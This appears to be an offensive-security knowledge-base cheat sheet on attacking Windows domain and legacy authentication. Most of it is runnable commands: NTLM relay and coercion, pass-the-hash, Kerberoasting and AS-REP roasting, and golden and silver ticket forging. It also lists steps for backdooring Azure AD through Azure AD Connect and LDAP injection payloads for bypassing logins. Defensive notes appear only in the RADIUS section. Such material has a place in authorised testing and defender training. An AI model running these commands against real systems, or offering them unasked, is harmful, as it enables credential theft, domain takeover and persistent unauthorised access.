# KB-43: Network & Legacy Auth Modern Attacks

## Overview

NTLM relay, Kerberos attacks in cloud-hybrid environments, and LDAP injection for auth bypass remain highly relevant in modern enterprise environments.

---

## 1. NTLM Relay in Modern Environments

### 1.1 Attack Flow

```
1. Coerce NTLM authentication from target (PetitPotam, PrinterBug, DFSCoerce)
2. Relay captured NTLM hash to a service that accepts NTLM
3. Authenticate as the victim to the relayed service
```

### 1.2 Coercion Techniques

| Technique | CVE | Protocol |
|-----------|-----|----------|
| PetitPotam | CVE-2021-36942 | MS-EFSRPC |
| PrinterBug | N/A | MS-RPRN |
| DFSCoerce | N/A | MS-DFSNM |
| ShadowCoerce | N/A | MS-FSRVP |

### 1.3 Relay Targets

```bash
# Relay to LDAP (create machine account, modify ACLs)
ntlmrelayx.py -t ldap://dc.target.com --delegate-access

# Relay to HTTP (ADCS web enrollment)
ntlmrelayx.py -t http://ca.target.com/certsrv/certfnsh.asp --adcs --template Machine

# Relay to SMB (execute commands)
ntlmrelayx.py -t smb://target-server -c "whoami"

# Relay to MSSQL
ntlmrelayx.py -t mssql://db.target.com -q "SELECT SYSTEM_USER"
```

### 1.4 Pass-the-Hash

```bash
# Use captured NTLM hash directly
crackmapexec smb target-range -u admin -H <NTLM_HASH>
evil-winrm -i target -u admin -H <NTLM_HASH>
impacket-psexec admin@target -hashes :<NTLM_HASH>
```

---

## 2. Kerberos Modern Attacks — Cloud-Hybrid

### 2.1 Kerberoasting

```bash
# Request TGS tickets for service accounts
GetUserSPNs.py target.com/user:pass -dc-ip DC_IP -request

# Crack offline
hashcat -m 13100 tgs_hashes.txt wordlist.txt
```

### 2.2 AS-REP Roasting

```bash
# Find accounts with DONT_REQUIRE_PREAUTH
GetNPUsers.py target.com/ -usersfile users.txt -dc-ip DC_IP

# Crack offline
hashcat -m 18200 asrep_hashes.txt wordlist.txt
```

### 2.3 Golden/Silver Ticket in Hybrid AD

```bash
# Golden Ticket — requires krbtgt hash
ticketer.py -nthash <KRBTGT_HASH> -domain-sid <SID> -domain target.com admin

# Silver Ticket — requires service account hash
ticketer.py -nthash <SVC_HASH> -domain-sid <SID> -domain target.com -spn MSSQL/server.target.com admin

# In hybrid AD (Azure AD Connect):
# Compromise AZUREADSSOACC$ account to forge Kerberos tickets for Azure SSO
```

### 2.4 Azure AD Connect Exploitation

```
1. Dump Azure AD Connect credentials (DPAPI or registry)
2. Use extracted credentials to access Azure AD as sync service
3. Reset any cloud user's password
4. Create backdoor cloud admin accounts
```

---

## 3. LDAP Injection for Auth Bypass

### 3.1 Injection Patterns

```
# Basic auth bypass
Username: *
Password: *

# Specific user bypass
Username: admin)(|(password=*
Password: anything

# Always-true filter
Username: *)(objectClass=*
Password: anything

# Blind LDAP injection
Username: admin)(|(description=a*
# Enumerate attributes character by character
```

### 3.2 Testing Matrix

| Input | Expected Filter | Injected Filter |
|-------|----------------|-----------------|
| `admin` | `(&(uid=admin)(pwd=pass))` | Normal |
| `admin)(uid=*))%00` | `(&(uid=admin)(uid=*))` | Auth bypass |
| `*)(objectClass=*)` | Always true | Auth bypass |
| `admin)(|(a=*` | OR injection | Auth bypass |

---

## 4. RADIUS/TACACS+ Protocol Attacks

### 4.1 Blast-RADIUS (CVE-2024-3596)

```
CVSS: 9.0 (Critical)
RADIUS uses MD5 for packet authentication
Attacker on network path can forge Access-Accept responses
Bypasses all RADIUS-based auth (WiFi, VPN, NAC)

Detection: RADIUS over UDP = vulnerable
Mitigation: RadSec (RADIUS over TLS) or Message-Authenticator attribute
```

### 4.2 TACACS+ Decryption

```
TACACS+ uses weak encryption (XOR with MD5-derived keystream)
If shared secret is captured, all traffic can be decrypted
Tool: loki (TACACS+ packet manipulation)
```

## References

- PetitPotam, PrinterBug, DFSCoerce documentation
- Kerberoasting/AS-REP Roasting techniques
- CVE-2024-3596: Blast-RADIUS
- Azure AD Connect security documentation
- LDAP Injection (OWASP)
